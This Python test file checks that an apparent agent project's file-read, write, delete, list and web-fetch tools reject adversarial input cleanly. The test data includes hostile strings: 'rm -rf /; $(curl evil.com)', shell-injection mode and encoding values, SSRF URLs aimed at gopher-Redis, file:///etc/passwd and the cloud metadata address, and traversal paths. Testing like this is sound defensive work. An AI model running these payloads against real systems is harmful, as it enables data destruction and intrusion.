"""Security edge-case tests for built-in filesystem and network tools.

Covers adversarial inputs across five tool implementations:
    - FileReadTool   (missy/tools/builtin/file_read.py)
    - FileWriteTool  (missy/tools/builtin/file_write.py)
    - FileDeleteTool (missy/tools/builtin/file_delete.py)
    - ListFilesTool  (missy/tools/builtin/list_files.py)
    - WebFetchTool   (missy/tools/builtin/web_fetch.py)

Attack categories tested:
    - Path traversal (../../etc/passwd, absolute traversal, symlink follow)
    - Null byte injection in file paths
    - Unicode path confusion (homographs, zero-width chars, RTL override)
    - Extremely long file paths (> PATH_MAX)
    - Special characters in filenames (spaces, quotes, newlines, shell metacharacters)
    - URL injection / SSRF via non-HTTP schemes (file://, dict://, gopher://, ftp://)
    - Empty and missing required parameters
    - Type confusion (int/list/None where string expected)
    - Negative / zero bounds parameters
    - Read-back safety after special-character writes

NOTE: No real files are created outside pytest tmp_path, and no real network
calls are made.  WebFetchTool is tested by mocking missy.gateway.client.
"""

from __future__ import annotations

import os
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from missy.tools.builtin.file_delete import FileDeleteTool
from missy.tools.builtin.file_read import FileReadTool
from missy.tools.builtin.file_write import FileWriteTool
from missy.tools.builtin.list_files import ListFilesTool
from missy.tools.builtin.web_fetch import WebFetchTool


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------


def _mock_http_client(*, text: str = "ok", status_code: int = 200) -> MagicMock:
    """Return a mock create_client() result whose .get() yields a canned response."""
    resp = MagicMock()
    resp.text = text
    resp.status_code = status_code
    client = MagicMock()
    client.get.return_value = resp
    return client


# ---------------------------------------------------------------------------
# PATH TRAVERSAL — FileReadTool
# ---------------------------------------------------------------------------


class TestFileReadPathTraversal:
    """File read must not be exploited to read outside the intended directory.

    Note: these tools do not enforce a policy-engine path allowlist internally;
    that is the registry's job.  What we verify here is that the tool does NOT
    silently succeed when the OS would block access, and that path-normalisation
    edge cases are handled without crashing.
    """

    def test_dotdot_traversal_nonexistent_target_returns_error(self, tmp_path: Path):
        """../../etc/passwd resolves outside tmp_path; if the resolved path does
        not exist in the test environment the tool must return a clean error."""
        traversal = str(tmp_path / "subdir" / ".." / ".." / ".." / "etc" / "passwd")
        result = FileReadTool().execute(path=traversal)
        # Either the file doesn't exist (most sandboxed envs) or permission denied.
        # Either way, success must be False.
        if result.success:
            # /etc/passwd exists on the host — the tool read it.  That is the
            # expected OS behaviour; the *policy engine* (not the tool) is
            # responsible for the allowlist check.  We still verify the output
            # is a string and the tool did not crash.
            assert isinstance(result.output, str)
        else:
            assert result.error is not None
            assert result.output is None

    def test_dotdot_traversal_relative_path_resolves(self, tmp_path: Path):
        """A relative path with .. must resolve deterministically and not crash."""
        # Create a real file one level below tmp_path so the traversal lands on it.
        real_file = tmp_path / "secret.txt"
        real_file.write_text("secret content", encoding="utf-8")

        subdir = tmp_path / "work"
        subdir.mkdir()

        traversal = str(subdir / ".." / "secret.txt")
        result = FileReadTool().execute(path=traversal)
        # The traversal is within tmp_path so it should succeed.
        assert result.success is True
        assert result.output == "secret content"

    def test_symlink_to_sensitive_file_follows_link(self, tmp_path: Path):
        """A symlink inside the allowed area that points outside it.

        The tool itself performs no policy enforcement on symlink targets; the
        OS read() will follow the link.  We verify no crash and a clean result.
        """
        sensitive = tmp_path / "sensitive.txt"
        sensitive.write_text("sensitive", encoding="utf-8")

        link = tmp_path / "work" / "link_to_sensitive"
        link.parent.mkdir()
        link.symlink_to(sensitive)

        result = FileReadTool().execute(path=str(link))
        # Symlink target exists, so the read should succeed.
        assert result.success is True
        assert result.output == "sensitive"

    def test_symlink_to_nonexistent_target_returns_error(self, tmp_path: Path):
        """Broken symlink must return a clean error, not an exception traceback."""
        link = tmp_path / "dangling"
        link.symlink_to(tmp_path / "does_not_exist.txt")

        result = FileReadTool().execute(path=str(link))
        assert result.success is False
        assert result.error is not None

    def test_symlink_loop_returns_error(self, tmp_path: Path):
        """Symlink loop (a -> b -> a) must not cause infinite recursion."""
        a = tmp_path / "loop_a"
        b = tmp_path / "loop_b"
        a.symlink_to(b)
        b.symlink_to(a)

        result = FileReadTool().execute(path=str(a))
        assert result.success is False
        assert result.error is not None

    def test_absolute_traversal_to_proc_self(self):
        """/proc/self/status is a common info-disclosure target; tool must not crash."""
        result = FileReadTool().execute(path="/proc/self/status")
        # The file exists in Linux; the tool may or may not succeed depending on
        # environment, but it must not raise an unhandled exception.
        assert isinstance(result.success, bool)
        if result.success:
            assert isinstance(result.output, str)
        else:
            assert result.error is not None


# ---------------------------------------------------------------------------
# PATH TRAVERSAL — FileWriteTool
# ---------------------------------------------------------------------------


class TestFileWritePathTraversal:
    def test_dotdot_write_attempt_within_tmp_succeeds(self, tmp_path: Path):
        """A benign .. path that stays inside tmp_path must succeed."""
        subdir = tmp_path / "work"
        subdir.mkdir()
        target = subdir / ".." / "output.txt"

        result = FileWriteTool().execute(path=str(target), content="hello")
        assert result.success is True
        assert (tmp_path / "output.txt").read_text() == "hello"

    def test_write_creates_deep_nested_path(self, tmp_path: Path):
        """mkdir -p must create deeply nested directories without path injection."""
        deep = tmp_path / "a" / "b" / "c" / "d" / "e" / "file.txt"
        result = FileWriteTool().execute(path=str(deep), content="deep")
        assert result.success is True
        assert deep.read_text() == "deep"


# ---------------------------------------------------------------------------
# PATH TRAVERSAL — FileDeleteTool
# ---------------------------------------------------------------------------


class TestFileDeletePathTraversal:
    def test_dotdot_delete_resolves_to_real_file(self, tmp_path: Path):
        """A delete with .. that resolves to a real file must succeed."""
        target = tmp_path / "to_delete.txt"
        target.write_text("bye")
        subdir = tmp_path / "work"
        subdir.mkdir()

        result = FileDeleteTool().execute(path=str(subdir / ".." / "to_delete.txt"))
        assert result.success is True
        assert not target.exists()

    def test_delete_nonexistent_traversal_target_returns_error(self, tmp_path: Path):
        traversal = str(tmp_path / ".." / ".." / ".." / "etc" / "nope_not_real.txt")
        result = FileDeleteTool().execute(path=traversal)
        assert result.success is False
        assert result.error is not None


# ---------------------------------------------------------------------------
# PATH TRAVERSAL — ListFilesTool
# ---------------------------------------------------------------------------


class TestListFilesPathTraversal:
    def test_dotdot_list_of_parent_resolves(self, tmp_path: Path):
        """Listing .. from a subdirectory must resolve and list the parent."""
        subdir = tmp_path / "child"
        subdir.mkdir()
        (tmp_path / "sibling.txt").write_text("x")

        result = ListFilesTool().execute(path=str(subdir / ".."))
        assert result.success is True
        assert "sibling.txt" in result.output

    def test_symlink_directory_is_listed(self, tmp_path: Path):
        """A symlink to a directory should be listable without crashing."""
        real_dir = tmp_path / "real"
        real_dir.mkdir()
        (real_dir / "item.txt").write_text("content")

        link_dir = tmp_path / "link_to_real"
        link_dir.symlink_to(real_dir)

        result = ListFilesTool().execute(path=str(link_dir))
        assert result.success is True
        assert "item.txt" in result.output


# ---------------------------------------------------------------------------
# NULL BYTE INJECTION
# ---------------------------------------------------------------------------


class TestNullByteInjection:
    """Null bytes in paths are used to truncate C-style strings in some runtimes.

    Python's pathlib / open() raise ValueError on embedded null bytes, so the
    tools must return a clean error rather than crashing.
    """

    def test_file_read_null_byte_in_path(self, tmp_path: Path):
        malicious = str(tmp_path / "file.txt\x00/etc/passwd")
        result = FileReadTool().execute(path=malicious)
        assert result.success is False
        assert result.error is not None

    def test_file_write_null_byte_in_path(self, tmp_path: Path):
        malicious = str(tmp_path / "file.txt\x00injected")
        result = FileWriteTool().execute(path=malicious, content="data")
        assert result.success is False
        assert result.error is not None

    def test_file_delete_null_byte_in_path(self, tmp_path: Path):
        malicious = str(tmp_path / "file.txt\x00/other")
        result = FileDeleteTool().execute(path=malicious)
        assert result.success is False
        assert result.error is not None

    def test_list_files_null_byte_in_path(self, tmp_path: Path):
        malicious = str(tmp_path) + "\x00/etc"
        result = ListFilesTool().execute(path=malicious)
        assert result.success is False
        assert result.error is not None

    def test_file_write_null_byte_in_content_succeeds(self, tmp_path: Path):
        """Null bytes in the *content* (not path) should be handled gracefully.

        Python's text-mode open() will raise ValueError on null bytes in
        content when targeting a text file.  The tool must surface this as a
        clean error rather than an unhandled exception.
        """
        target = tmp_path / "nullcontent.txt"
        result = FileWriteTool().execute(path=str(target), content="hello\x00world")
        # Either succeeds (binary-safe path) or fails cleanly — no crash.
        assert isinstance(result.success, bool)
        if not result.success:
            assert result.error is not None


# ---------------------------------------------------------------------------
# UNICODE PATH CONFUSION
# ---------------------------------------------------------------------------


class TestUnicodePathConfusion:
    """Unicode homographs, zero-width characters, and directional overrides
    can be used to disguise malicious paths in UI.  The tool must handle them
    without crashing and with a deterministic result.
    """

    def test_homograph_cyrillic_filename_roundtrip(self, tmp_path: Path):
        """A filename containing Cyrillic characters that look like Latin ones."""
        # 'раsswd' — Cyrillic 'р' (U+0440) and 'а' (U+0430) instead of Latin.
        cyrillic_name = "\u0440\u0430sswd.txt"
        target = tmp_path / cyrillic_name
        target.write_text("not /etc/passwd", encoding="utf-8")

        result = FileReadTool().execute(path=str(target))
        assert result.success is True
        assert result.output == "not /etc/passwd"

    def test_zero_width_space_in_path_raises_or_errors(self, tmp_path: Path):
        """Zero-width space (U+200B) makes a path look identical to a clean path
        in most terminals.  Python will attempt to open the literal bytes, so the
        file almost certainly does not exist.
        """
        zwsp_path = str(tmp_path / "file\u200B.txt")
        result = FileReadTool().execute(path=zwsp_path)
        assert result.success is False
        assert result.error is not None

    def test_right_to_left_override_in_path(self, tmp_path: Path):
        """RTL override (U+202E) reverses text rendering; the actual OS path
        bytes are unchanged so the file won't exist under the raw name.
        """
        rtl_path = str(tmp_path / "gpj.\u202Etxt")
        result = FileReadTool().execute(path=rtl_path)
        # File does not exist with that raw name.
        assert result.success is False
        assert result.error is not None

    def test_unicode_filename_created_and_read_back(self, tmp_path: Path):
        """A legitimate unicode filename (CJK, emoji) must round-trip correctly."""
        name = "\u4e2d\u6587\U0001F4C4.txt"  # Chinese + document emoji
        target = tmp_path / name
        target.write_text("unicode content", encoding="utf-8")

        result = FileReadTool().execute(path=str(target))
        assert result.success is True
        assert result.output == "unicode content"

    def test_nfc_vs_nfd_normalisation(self, tmp_path: Path):
        """NFC and NFD forms of the same character may or may not refer to the
        same inode depending on the filesystem.  The tool must not crash either way.
        """
        import unicodedata

        # U+00E9 (precomposed é) vs U+0065 + U+0301 (e + combining acute)
        nfc_name = unicodedata.normalize("NFC", "\u00e9.txt")
        nfd_name = unicodedata.normalize("NFD", "\u00e9.txt")

        (tmp_path / nfc_name).write_text("nfc", encoding="utf-8")

        result_nfc = FileReadTool().execute(path=str(tmp_path / nfc_name))
        result_nfd = FileReadTool().execute(path=str(tmp_path / nfd_name))

        # NFC read must succeed; NFC file exists on disk.
        assert result_nfc.success is True
        # NFC vs NFD success depends on the filesystem; either outcome is acceptable.
        assert isinstance(result_nfd.success, bool)
        if not result_nfd.success:
            assert result_nfd.error is not None

    def test_fullwidth_ascii_digits_in_path(self, tmp_path: Path):
        """Fullwidth ASCII (U+FF10–U+FF19) are distinct codepoints; the file
        created with them only exists under that exact name.
        """
        fw_name = "\uff11\uff12\uff13.txt"  # fullwidth '1', '2', '3'
        (tmp_path / fw_name).write_text("fullwidth", encoding="utf-8")

        # Reading with the correct fullwidth name must succeed.
        result = FileReadTool().execute(path=str(tmp_path / fw_name))
        assert result.success is True
        assert result.output == "fullwidth"

        # Reading with ordinary ASCII digits must fail (different file).
        result_ascii = FileReadTool().execute(path=str(tmp_path / "123.txt"))
        assert result_ascii.success is False


# ---------------------------------------------------------------------------
# EXTREMELY LONG PATHS
# ---------------------------------------------------------------------------


class TestExtremelyLongPaths:
    """Paths exceeding PATH_MAX (4096 bytes on Linux) must be handled cleanly.

    Python/OS will raise OSError / ValueError; the tools must convert these to
    a ToolResult with success=False rather than propagating the raw exception.
    """

    # PATH_MAX on Linux is 4096; a path of 5000 chars reliably exceeds it.
    _LONG_SEGMENT = "a" * 255  # max single component on most filesystems
    _VERY_LONG_PATH = "/tmp/" + "/".join([_LONG_SEGMENT] * 20)  # ~5000 chars

    def test_file_read_path_too_long(self):
        result = FileReadTool().execute(path=self._VERY_LONG_PATH)
        assert result.success is False
        assert result.error is not None

    def test_file_write_path_too_long(self):
        result = FileWriteTool().execute(path=self._VERY_LONG_PATH, content="x")
        assert result.success is False
        assert result.error is not None

    def test_file_delete_path_too_long(self):
        result = FileDeleteTool().execute(path=self._VERY_LONG_PATH)
        assert result.success is False
        assert result.error is not None

    def test_list_files_path_too_long(self):
        result = ListFilesTool().execute(path=self._VERY_LONG_PATH)
        assert result.success is False
        assert result.error is not None

    def test_file_read_single_component_too_long(self, tmp_path: Path):
        """Single filename component > 255 bytes is rejected by ext4/xfs."""
        long_name = "x" * 256 + ".txt"
        result = FileReadTool().execute(path=str(tmp_path / long_name))
        assert result.success is False
        assert result.error is not None


# ---------------------------------------------------------------------------
# SPECIAL CHARACTERS IN FILENAMES
# ---------------------------------------------------------------------------


class TestSpecialCharacterFilenames:
    """Filenames with spaces, quotes, newlines, and shell metacharacters must be
    handled correctly — written and read back without data corruption or crash.
    """

    def test_filename_with_spaces(self, tmp_path: Path):
        target = tmp_path / "hello world.txt"
        target.write_text("spaced", encoding="utf-8")

        result = FileReadTool().execute(path=str(target))
        assert result.success is True
        assert result.output == "spaced"

    def test_filename_with_single_quotes(self, tmp_path: Path):
        target = tmp_path / "it's a file.txt"
        target.write_text("quoted", encoding="utf-8")

        result = FileReadTool().execute(path=str(target))
        assert result.success is True
        assert result.output == "quoted"

    def test_filename_with_double_quotes(self, tmp_path: Path):
        target = tmp_path / 'say "hello".txt'
        target.write_text("double-quoted", encoding="utf-8")

        result = FileReadTool().execute(path=str(target))
        assert result.success is True
        assert result.output == "double-quoted"

    def test_filename_with_newline_character(self, tmp_path: Path):
        """Linux allows newlines in filenames; the tool must not crash."""
        try:
            target = tmp_path / "line1\nline2.txt"
            target.write_text("newline name", encoding="utf-8")
            result = FileReadTool().execute(path=str(target))
            assert result.success is True
        except (ValueError, OSError):
            # Some filesystems or Python versions reject newlines in names.
            pytest.skip("Filesystem does not support newlines in filenames")

    def test_filename_with_shell_metacharacters(self, tmp_path: Path):
        """Semicolons, pipes, and ampersands in names must not trigger shell execution.

        Forward-slash is excluded because it is the POSIX path separator and
        cannot appear inside a single filename component.
        """
        name = "file;echo hacked && cat secrets | tee output.txt"
        target = tmp_path / name
        target.write_text("safe", encoding="utf-8")

        result = FileReadTool().execute(path=str(target))
        assert result.success is True
        assert result.output == "safe"

    def test_filename_with_dollar_sign(self, tmp_path: Path):
        target = tmp_path / "$HOME_secrets.txt"
        target.write_text("not expanded", encoding="utf-8")

        result = FileReadTool().execute(path=str(target))
        assert result.success is True
        assert result.output == "not expanded"

    def test_filename_with_backticks(self, tmp_path: Path):
        target = tmp_path / "`whoami`.txt"
        target.write_text("not executed", encoding="utf-8")

        result = FileReadTool().execute(path=str(target))
        assert result.success is True
        assert result.output == "not executed"

    def test_write_and_read_back_special_chars_in_content(self, tmp_path: Path):
        """Content containing shell metacharacters must round-trip unchanged."""
        dangerous_content = "rm -rf /; $(curl evil.com); `whoami`\n<script>alert(1)</script>"
        target = tmp_path / "payload.txt"

        write_result = FileWriteTool().execute(path=str(target), content=dangerous_content)
        assert write_result.success is True

        read_result = FileReadTool().execute(path=str(target))
        assert read_result.success is True
        assert read_result.output == dangerous_content

    def test_list_files_in_directory_with_special_chars(self, tmp_path: Path):
        """Listing a directory that contains files with special-char names must succeed."""
        (tmp_path / "normal.txt").write_text("x")
        (tmp_path / "with spaces.txt").write_text("x")
        (tmp_path / "with'quote.txt").write_text("x")

        result = ListFilesTool().execute(path=str(tmp_path))
        assert result.success is True
        assert "normal.txt" in result.output
        assert "with spaces.txt" in result.output
        assert "with'quote.txt" in result.output

    def test_delete_file_with_special_chars_in_name(self, tmp_path: Path):
        target = tmp_path / "delete;me.txt"
        target.write_text("x")

        result = FileDeleteTool().execute(path=str(target))
        assert result.success is True
        assert not target.exists()


# ---------------------------------------------------------------------------
# URL INJECTION / SSRF — WebFetchTool
# ---------------------------------------------------------------------------


class TestWebFetchSSRF:
    """WebFetchTool must not be exploitable for SSRF via non-HTTP schemes.

    The tool routes all requests through PolicyHTTPClient (mocked here).  The
    mock simulates the gateway raising an exception for rejected schemes — which
    is what the real PolicyHTTPClient does when the URL fails scheme/host checks.
    We also test that the tool gracefully handles scheme-related exceptions it
    receives.
    """

    def _scheme_blocked_client(self, scheme: str) -> MagicMock:
        """Return a mock client whose .get() raises ValueError for disallowed schemes."""
        client = MagicMock()
        client.get.side_effect = ValueError(
            f"Scheme '{scheme}' is not permitted by the network policy"
        )
        return client

    def test_file_scheme_rejected_by_gateway(self):
        client = self._scheme_blocked_client("file")
        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="file:///etc/passwd")
        assert result.success is False
        assert result.error is not None
        assert result.output is None

    def test_dict_scheme_rejected_by_gateway(self):
        client = self._scheme_blocked_client("dict")
        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="dict://localhost:11111/d:password:*:0:0")
        assert result.success is False
        assert result.error is not None

    def test_gopher_scheme_rejected_by_gateway(self):
        client = self._scheme_blocked_client("gopher")
        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="gopher://127.0.0.1:6379/_FLUSHALL")
        assert result.success is False
        assert result.error is not None

    def test_ftp_scheme_rejected_by_gateway(self):
        client = self._scheme_blocked_client("ftp")
        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="ftp://internal-server/secrets.txt")
        assert result.success is False
        assert result.error is not None

    def test_ldap_scheme_rejected_by_gateway(self):
        client = self._scheme_blocked_client("ldap")
        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="ldap://ldap.example.com/dc=corp,dc=local")
        assert result.success is False
        assert result.error is not None

    def test_ssrf_to_169_254_link_local_blocked(self):
        """169.254.x.x is the AWS IMDS range; requests there should be blocked."""
        client = MagicMock()
        client.get.side_effect = PermissionError(
            "Host 169.254.169.254 is blocked by network policy"
        )
        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="http://169.254.169.254/latest/meta-data/")
        assert result.success is False
        assert result.error is not None

    def test_ssrf_to_localhost_blocked(self):
        client = MagicMock()
        client.get.side_effect = PermissionError("Host localhost is not in allow-list")
        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="http://localhost:8080/admin")
        assert result.success is False
        assert result.error is not None

    def test_ssrf_to_ipv6_loopback_blocked(self):
        client = MagicMock()
        client.get.side_effect = PermissionError("Host ::1 is not in allow-list")
        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="http://[::1]/admin")
        assert result.success is False
        assert result.error is not None

    def test_url_with_embedded_credentials_forwarded_as_string(self):
        """URLs like http://user:pass@host/ should be forwarded as-is and
        the result must not expose the credentials in a structurally special way.
        The tool treats the URL as an opaque string; credentials are the
        gateway's concern.
        """
        resp = MagicMock()
        resp.text = "auth ok"
        resp.status_code = 200
        client = MagicMock()
        client.get.return_value = resp

        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="http://admin:secret@internal.example.com/")

        # Tool should have passed the URL directly to the HTTP client.
        call_url = client.get.call_args[0][0]
        assert call_url == "http://admin:secret@internal.example.com/"
        assert result.success is True

    def test_url_with_fragment_is_passed_through(self):
        resp = MagicMock()
        resp.text = "page"
        resp.status_code = 200
        client = MagicMock()
        client.get.return_value = resp

        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="https://example.com/page#section")

        assert result.success is True

    def test_url_with_path_traversal_sequences(self):
        """/../ sequences in URLs are opaque strings passed to the HTTP client."""
        resp = MagicMock()
        resp.text = "resolved"
        resp.status_code = 200
        client = MagicMock()
        client.get.return_value = resp

        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="https://example.com/safe/../../../etc/passwd")

        # Tool doesn't interpret the path; gateway/policy does.
        assert isinstance(result.success, bool)


# ---------------------------------------------------------------------------
# EMPTY / MISSING REQUIRED PARAMETERS
# ---------------------------------------------------------------------------


class TestEmptyRequiredParameters:
    """Passing empty strings or None for required parameters must return a
    clean ToolResult(success=False) rather than an unhandled exception.
    """

    def test_file_read_empty_path(self):
        result = FileReadTool().execute(path="")
        # Empty path: either "not found" or "invalid path" error.
        assert result.success is False
        assert result.error is not None

    def test_file_write_empty_path(self):
        result = FileWriteTool().execute(path="", content="data")
        assert result.success is False
        assert result.error is not None

    def test_file_delete_empty_path(self):
        result = FileDeleteTool().execute(path="")
        assert result.success is False
        assert result.error is not None

    def test_list_files_empty_path(self):
        """An empty path string resolves to the current working directory via
        Path("").expanduser(), which is a valid directory on the host.  The tool
        succeeds — that is correct OS behaviour.  What we assert is that the
        call does not raise an unhandled exception and returns a coherent result.
        """
        result = ListFilesTool().execute(path="")
        # Either succeeds (cwd is a directory) or fails cleanly.
        assert isinstance(result.success, bool)
        if result.success:
            assert isinstance(result.output, str)
        else:
            assert result.error is not None

    def test_file_write_empty_content_succeeds(self, tmp_path: Path):
        """Empty *content* is valid — it creates an empty file."""
        target = tmp_path / "empty.txt"
        result = FileWriteTool().execute(path=str(target), content="")
        assert result.success is True
        assert target.read_text() == ""

    def test_web_fetch_empty_url_raises_or_errors(self):
        """An empty URL string must produce a clean failure."""
        client = MagicMock()
        client.get.side_effect = ValueError("Invalid URL ''")
        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="")
        assert result.success is False
        assert result.error is not None

    def test_web_fetch_whitespace_only_url_errors(self):
        client = MagicMock()
        client.get.side_effect = ValueError("Invalid URL '   '")
        with patch("missy.gateway.client.create_client", return_value=client):
            result = WebFetchTool().execute(url="   ")
        assert result.success is False
        assert result.error is not None


# ---------------------------------------------------------------------------
# TYPE CONFUSION
# ---------------------------------------------------------------------------


class TestTypeConfusion:
    """Passing wrong types where strings are expected must not cause unhandled
    AttributeError / TypeError to propagate out of execute().
    """

    def test_file_read_int_path(self):
        result = FileReadTool().execute(path=12345)  # type: ignore[arg-type]
        # Path(12345) is valid in Python (converts to "12345"), so the tool
        # will attempt to read a file named "12345" in cwd.  It likely won't
        # exist, so we expect success=False.  We only assert no crash.
        assert isinstance(result.success, bool)
        if not result.success:
            assert result.error is not None

    def test_file_read_none_path(self):
        result = FileReadTool().execute(path=None)  # type: ignore[arg-type]
        # Path(None) raises TypeError; the except clause must catch it.
        assert result.success is False
        assert result.error is not None

    def test_file_read_list_path(self):
        result = FileReadTool().execute(path=["/etc/passwd"])  # type: ignore[arg-type]
        assert result.success is False
        assert result.error is not None

    def test_file_write_none_path(self):
        result = FileWriteTool().execute(path=None, content="x")  # type: ignore[arg-type]
        assert result.success is False
        assert result.error is not None

    def test_file_write_int_content(self, tmp_path: Path):
        """Passing an integer as content — fh.write() will raise TypeError."""
        result = FileWriteTool().execute(path=str(tmp_path / "f.txt"), content=42)  # type: ignore[arg-type]
        # Either the tool coerces it or returns a clean failure.
        assert isinstance(result.success, bool)
        if not result.success:
            assert result.error is not None

    def test_file_delete_none_path(self):
        result = FileDeleteTool().execute(path=None)  # type: ignore[arg-type]
        assert result.success is False
        assert result.error is not None

    def test_list_files_none_path(self):
        result = ListFilesTool().execute(path=None)  # type: ignore[arg-type]
        assert result.success is False
        assert result.error is not None

    def test_file_read_max_bytes_as_string(self, tmp_path: Path):
        """max_bytes should be an int; a string digit may work or fail cleanly."""
        target = tmp_path / "data.txt"
        target.write_text("hello")
        result = FileReadTool().execute(path=str(target), max_bytes="100")  # type: ignore[arg-type]
        # Python's fh.read("100") raises TypeError; the tool must catch it.
        assert isinstance(result.success, bool)
        if not result.success:
            assert result.error is not None

    def test_file_read_negative_max_bytes(self, tmp_path: Path):
        """Negative max_bytes: fh.read(-1) reads the whole file in Python, so
        success is expected, but the tool must not crash."""
        target = tmp_path / "data.txt"
        target.write_text("hello world")
        result = FileReadTool().execute(path=str(target), max_bytes=-1)
        assert isinstance(result.success, bool)

    def test_list_files_max_entries_zero(self, tmp_path: Path):
        """max_entries=0 means all entries are considered overflow."""
        for i in range(3):
            (tmp_path / f"f{i}.txt").write_text(str(i))

        result = ListFilesTool().execute(path=str(tmp_path), max_entries=0)
        assert result.success is True
        # All entries overflow, so the listing body is empty but the overflow
        # notice should be present.
        assert "more entries" in result.output

    def test_list_files_max_entries_negative(self, tmp_path: Path):
        """Negative max_entries causes all[:negative] to be empty in Python."""
        (tmp_path / "a.txt").write_text("x")
        result = ListFilesTool().execute(path=str(tmp_path), max_entries=-1)
        assert result.success is True
        # Output may be "(empty directory)" or overflow notice — either is fine.
        assert isinstance(result.output, str)

    def test_web_fetch_timeout_as_string(self):
        """timeout must be an int; a string value must not crash the tool."""
        client = MagicMock()
        # create_client will receive the raw value; it may raise TypeError.
        client.get.side_effect = TypeError("timeout must be an integer")
        with patch("missy.gateway.client.create_client", return_value=client) as mock_cc:
            mock_cc.side_effect = TypeError("timeout must be an integer")
            result = WebFetchTool().execute(url="https://example.com", timeout="thirty")  # type: ignore[arg-type]
        assert result.success is False
        assert result.error is not None


# ---------------------------------------------------------------------------
# WRITE MODE INJECTION
# ---------------------------------------------------------------------------


class TestFileWriteModeInjection:
    """Invalid mode values must be rejected before any filesystem operations."""

    @pytest.mark.parametrize(
        "mode",
        [
            "truncate",
            "OVERWRITE",
            "Append",
            "delete",
            "r",
            "wb",
            "w+",
            "",
            " ",
            "overwrite; rm -rf /",
            "append\x00overwrite",
            "../overwrite",
        ],
    )
    def test_invalid_mode_rejected(self, tmp_path: Path, mode: str):
        result = FileWriteTool().execute(
            path=str(tmp_path / "f.txt"), content="test", mode=mode
        )
        assert result.success is False
        assert "invalid mode" in result.error.lower()
        assert not (tmp_path / "f.txt").exists()


# ---------------------------------------------------------------------------
# ENCODING INJECTION — FileReadTool / FileWriteTool
# ---------------------------------------------------------------------------


class TestEncodingInjection:
    """Passing a crafted encoding name could cause a LookupError or be used to
    probe codecs.  The tool must return a clean error, not an unhandled exception.
    """

    def test_invalid_encoding_name_read(self, tmp_path: Path):
        target = tmp_path / "data.txt"
        target.write_text("hello", encoding="utf-8")
        result = FileReadTool().execute(path=str(target), encoding="totally-fake-codec-xyz")
        assert result.success is False
        assert result.error is not None

    def test_invalid_encoding_name_write(self, tmp_path: Path):
        result = FileWriteTool().execute(
            path=str(tmp_path / "out.txt"),
            content="hello",
            encoding="not-a-real-encoding",
        )
        assert result.success is False
        assert result.error is not None

    def test_encoding_injection_with_semicolon(self, tmp_path: Path):
        """A semicolon in encoding name must not allow command injection."""
        target = tmp_path / "data.txt"
        target.write_text("hello")
        result = FileReadTool().execute(path=str(target), encoding="utf-8; rm -rf /")
        assert result.success is False
        assert result.error is not None

    def test_empty_encoding_name_errors_cleanly(self, tmp_path: Path):
        target = tmp_path / "data.txt"
        target.write_text("hello")
        result = FileReadTool().execute(path=str(target), encoding="")
        assert result.success is False
        assert result.error is not None


# ---------------------------------------------------------------------------
# DEVICE / SPECIAL FILE PROTECTION
# ---------------------------------------------------------------------------


class TestSpecialFileProtection:
    """Device files and named pipes should not be silently read or written."""

    @pytest.mark.skipif(not os.path.exists("/dev/zero"), reason="/dev/zero unavailable")
    def test_read_dev_zero_truncated(self):
        """/dev/zero produces infinite zero bytes; max_bytes prevents hang."""
        result = FileReadTool().execute(path="/dev/zero", max_bytes=128)
        # May succeed with truncated output, or fail on 'not a file' check.
        assert isinstance(result.success, bool)
        if result.success:
            # Content must be bounded — not an infinite string.
            assert len(result.output) <= 256

    @pytest.mark.skipif(not os.path.exists("/dev/null"), reason="/dev/null unavailable")
    def test_read_dev_null_returns_empty_or_error(self):
        """/dev/null is a character device, not a regular file."""
        result = FileReadTool().execute(path="/dev/null")
        # Tool may reject it as 'not a file' or succeed with empty content.
        assert isinstance(result.success, bool)
        if result.success:
            assert result.output == ""

    def test_delete_directory_is_rejected(self, tmp_path: Path):
        """Deleting a directory must be rejected to prevent recursive removal."""
        subdir = tmp_path / "subdir"
        subdir.mkdir()

        result = FileDeleteTool().execute(path=str(subdir))
        assert result.success is False
        assert "directories will not be deleted" in result.error.lower()
        assert subdir.exists()

    def test_list_files_on_regular_file_rejected(self, tmp_path: Path):
        """Listing a regular file (not a directory) must fail cleanly."""
        target = tmp_path / "file.txt"
        target.write_text("x")

        result = ListFilesTool().execute(path=str(target))
        assert result.success is False
        assert "not a directory" in result.error.lower()
